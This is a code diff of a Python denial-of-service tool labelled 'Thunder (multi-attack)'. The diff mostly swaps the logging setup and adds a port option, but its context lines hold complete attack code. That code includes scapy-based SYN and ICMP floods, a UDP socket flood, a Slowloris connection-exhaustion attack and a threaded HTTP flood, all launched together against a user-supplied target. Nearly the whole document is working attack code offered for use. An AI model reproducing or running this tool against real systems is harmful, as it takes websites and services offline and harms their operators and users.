@@ -7,20 +7,22 @@ import random
 import time
 from urllib.parse import urlparse
 from colorama import Fore, init
-from tqdm import tqdm
-from proxy import get_proxies
 from banner import logo
 from scapy.all import IP, TCP, ICMP, UDP, send
 from uagents import get_random_uagent
 import logging
+from rich.logging import RichHandler
 
 init(autoreset=True)
 
 logging.basicConfig(
     level=logging.INFO,
     format='[%(asctime)s] %(levelname)s - %(message)s',
-    datefmt='%H:%M:%S'
+    datefmt='%H:%M:%S',
+    handlers=[RichHandler()]
 )
+
+log = logging.getLogger("rich")
 
 def parse_url(target_url):
     parsed = urlparse(target_url)
@@ -43,33 +45,33 @@ def build_packet(host, path):
     return packet.encode("utf-8")
 
 def syn_flood(target_ip, target_port, count=100):
-    logging.info(f"Starting SYN Flood attack on {target_ip}:{target_port} (count={count})")
+    log.info(f"Starting SYN Flood attack on {target_ip}:{target_port} (count={count})")
     for i in range(count):
         ip = IP(dst=target_ip)
         tcp = TCP(dport=target_port, flags='S')
         send(ip/tcp, verbose=0)
-        logging.info(f"SYN FLOOD - PACKET {i+1}/{count} sent")
-    logging.info(f"SYN Flood attack finished on {target_ip}:{target_port}")
+        log.info(f"SYN FLOOD - PACKET {i+1}/{count} sent")
+    log.info(f"SYN Flood attack finished on {target_ip}:{target_port}")
 
 def udp_flood(target_ip, target_port, count=100):
-    logging.info(f"Starting UDP Flood attack on {target_ip}:{target_port} (count={count})")
+    log.info(f"Starting UDP Flood attack on {target_ip}:{target_port} (count={count})")
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     data = b'X' * 1024
     for i in range(count):
         sock.sendto(data, (target_ip, target_port))
-        logging.info(f"UDP FLOOD - PACKET {i+1}/{count} sent")
-    logging.info(f"UDP Flood attack finished on {target_ip}:{target_port}")
+        log.info(f"UDP FLOOD - PACKET {i+1}/{count} sent")
+    log.info(f"UDP Flood attack finished on {target_ip}:{target_port}")
 
 def icmp_flood(target_ip, count=100):
-    logging.info(f"Starting ICMP Flood attack on {target_ip} (count={count})")
+    log.info(f"Starting ICMP Flood attack on {target_ip} (count={count})")
     for i in range(count):
         packet = IP(dst=target_ip)/ICMP()
         send(packet, verbose=0)
-        logging.info(f"ICMP FLOOD - PACKET {i+1}/{count} sent")
-    logging.info(f"ICMP Flood attack finished on {target_ip}")
+        log.info(f"ICMP FLOOD - PACKET {i+1}/{count} sent")
+    log.info(f"ICMP Flood attack finished on {target_ip}")
 
 def slowloris_attack(target_host, target_port, num_sockets=50):
-    logging.info(f"Starting Slowloris attack on {target_host}:{target_port} (sockets={num_sockets})")
+    log.info(f"Starting Slowloris attack on {target_host}:{target_port} (sockets={num_sockets})")
     sockets = []
     for i in range(num_sockets):
         try:
@@ -79,9 +81,9 @@ def slowloris_attack(target_host, target_port, num_sockets=50):
             s.send(f"GET /?{i} HTTP/1.1\r\n".encode())
             s.send(f"Host: {target_host}\r\n".encode())
             sockets.append(s)
-            logging.info(f"SLOWLORIS - SOCKET {i+1}/{num_sockets} opened")
+            log.info(f"SLOWLORIS - SOCKET {i+1}/{num_sockets} opened")
         except:
-            logging.info(f"SLOWLORIS - Error opening socket {i+1}")
+            log.info(f"SLOWLORIS - Error opening socket {i+1}")
             pass
     try:
         pkt_count = 0
@@ -90,12 +92,12 @@ def slowloris_attack(target_host, target_port, num_sockets=50):
                 try:
                     s.send(b"X-a: b\r\n")
                     pkt_count += 1
-                    logging.info(f"SLOWLORIS - HEADER {pkt_count} sent")
+                    log.info(f"SLOWLORIS - HEADER {pkt_count} sent")
                 except:
                     sockets.remove(s)
             time.sleep(10)
     except KeyboardInterrupt:
-        logging.info(f"Slowloris attack stopped on {target_host}:{target_port}")
+        log.info(f"Slowloris attack stopped on {target_host}:{target_port}")
 
 def send_request(i, target_url, _):
     p = urlparse(target_url)
@@ -117,13 +119,13 @@ def send_request(i, target_url, _):
         line = resp.split(b"\r\n",1)[0]
         try:
             code = int(line.split()[1])
-            logging.info(f"HTTP FLOOD - CODE - HTTP {code}")
+            log.info(f"HTTP FLOOD - CODE - HTTP {code}")
             return code
         except:
-            logging.info(f"HTTP FLOOD - CODE - HTTP: {line.decode(errors='ignore')}")
+            log.info(f"HTTP FLOOD - CODE - HTTP: {line.decode(errors='ignore')}")
             return line.decode(errors="ignore")
     except Exception as e:
-        logging.info(f"HTTP FLOOD - ERROR: {e}")
+        log.info(f"HTTP FLOOD - ERROR: {e}")
         return str(e)
 
 def get_random_proxy(proxy_list):
@@ -132,71 +134,72 @@ def get_random_proxy(proxy_list):
     return None
 
 def run_http_flood(target_url, packages, threads):
-    logging.info(f"Starting HTTP Flood attack on {target_url} (packages={packages}, threads={threads})")
+    log.info(f"Starting HTTP Flood attack on {target_url} (packages={packages}, threads={threads})")
     with ThreadPoolExecutor(max_workers=threads) as executor:
         futures = {executor.submit(send_request, i, target_url, None): i for i in range(packages)}
         completed = 0
         for future in as_completed(futures):
             future.result()
             completed += 1
-            logging.info(f"HTTP FLOOD - {completed}/{packages} requests sent")
-    logging.info(f"HTTP Flood attack finished on {target_url}")
+            log.info(f"HTTP FLOOD - {completed}/{packages} requests sent")
+    log.info(f"HTTP Flood attack finished on {target_url}")
 
 def run_syn_flood(host, port, count, threads):
-    logging.info(f"SYN Flood attack started for {host}:{port} (count={count}, threads={threads})")
+    log.info(f"SYN Flood attack started for {host}:{port} (count={count}, threads={threads})")
     def syn_task(_):
         syn_flood(host, port, count // threads)
     with ThreadPoolExecutor(max_workers=threads) as executor:
         futures = [executor.submit(syn_task, i) for i in range(threads)]
         for i, future in enumerate(as_completed(futures), 1):
             future.result()
-            logging.info(f"SYN FLOOD - {i}/{threads} threads finished")
-    logging.info(f"SYN Flood attack finished for {host}:{port}")
+            log.info(f"SYN FLOOD - {i}/{threads} threads finished")
+    log.info(f"SYN Flood attack finished for {host}:{port}")
 
 def run_udp_flood(host, port, count, threads):
-    logging.info(f"UDP Flood attack started for {host}:{port} (count={count}, threads={threads})")
+    log.info(f"UDP Flood attack started for {host}:{port} (count={count}, threads={threads})")
     def udp_task(_):
         udp_flood(host, port, count // threads)
     with ThreadPoolExecutor(max_workers=threads) as executor:
         futures = [executor.submit(udp_task, i) for i in range(threads)]
         for i, future in enumerate(as_completed(futures), 1):
             future.result()
-            logging.info(f"UDP FLOOD - {i}/{threads} threads finished")
-    logging.info(f"UDP Flood attack finished for {host}:{port}")
+            log.info(f"UDP FLOOD - {i}/{threads} threads finished")
+    log.info(f"UDP Flood attack finished for {host}:{port}")
 
 def run_icmp_flood(host, count, threads):
-    logging.info(f"ICMP Flood attack started for {host} (count={count}, threads={threads})")
+    log.info(f"ICMP Flood attack started for {host} (count={count}, threads={threads})")
     def icmp_task(_):
         icmp_flood(host, count // threads)
     with ThreadPoolExecutor(max_workers=threads) as executor:
         futures = [executor.submit(icmp_task, i) for i in range(threads)]
         for i, future in enumerate(as_completed(futures), 1):
             future.result()
-            logging.info(f"ICMP FLOOD - {i}/{threads} threads finished")
-    logging.info(f"ICMP Flood attack finished for {host}")
+            log.info(f"ICMP FLOOD - {i}/{threads} threads finished")
+    log.info(f"ICMP Flood attack finished for {host}")
 
 def run_slowloris(host, port, sockets, threads):
-    logging.info(f"Slowloris attack started for {host}:{port} (sockets={sockets}, threads={threads})")
+    log.info(f"Slowloris attack started for {host}:{port} (sockets={sockets}, threads={threads})")
     def slowloris_task(_):
         slowloris_attack(host, port, sockets // threads)
     with ThreadPoolExecutor(max_workers=threads) as executor:
         futures = [executor.submit(slowloris_task, i) for i in range(threads)]
         for i, future in enumerate(as_completed(futures), 1):
             future.result()
-            logging.info(f"SLOWLORIS - {i}/{threads} threads finished")
-    logging.info(f"Slowloris attack finished for {host}:{port}")
+            log.info(f"SLOWLORIS - {i}/{threads} threads finished")
+    log.info(f"Slowloris attack finished for {host}:{port}")
 
 if __name__ == "__main__":
     logo()
     parser = argparse.ArgumentParser(description="Thunder (multi-attack)")
     parser.add_argument("target", help="Target url (http or https)")
-    parser.add_argument("-p", "--packages", help="Packages count", type=int, default=1000)
+    parser.add_argument("--port", help="Port", type=int, default=443)
+    parser.add_argument("-pkgs", "--packages", help="Packages count", type=int, default=1000)
     parser.add_argument("-t", "--threads", help="Threads count", type=int, default=10)
     args = parser.parse_args()
 
     p = urlparse(args.target)
     host = p.hostname
-    port = p.port or (443 if p.scheme=="https" else 80)
+    port = args.port
 
     attack_tasks = [
         (run_http_flood, (args.target, round(args.packages/5), args.threads)),
@@ -206,7 +209,7 @@ if __name__ == "__main__":
         (run_slowloris, (host, port, round(args.packages/5), args.threads)),
     ]
 
-    logging.info("Starting all attack tasks using ThreadPoolExecutor...")
+    log.info("Starting all attack tasks using ThreadPoolExecutor...")
     with ThreadPoolExecutor(max_workers=len(attack_tasks)) as executor:
         futures = []
         for func, args_tuple in attack_tasks:
@@ -214,7 +217,7 @@ if __name__ == "__main__":
         for i, future in enumerate(as_completed(futures), 1):
             try:
                 future.result()
-                logging.info(f"Attack task {i}/{len(attack_tasks)} finished")
+                log.info(f"Attack task {i}/{len(attack_tasks)} finished")
             except Exception as e:
-                logging.error(f"Attack task {i} raised an exception: {e}")
-    logging.info("All attacks finished.")
+                log.error(f"Attack task {i} raised an exception: {e}")
+    log.info("All attacks finished.")
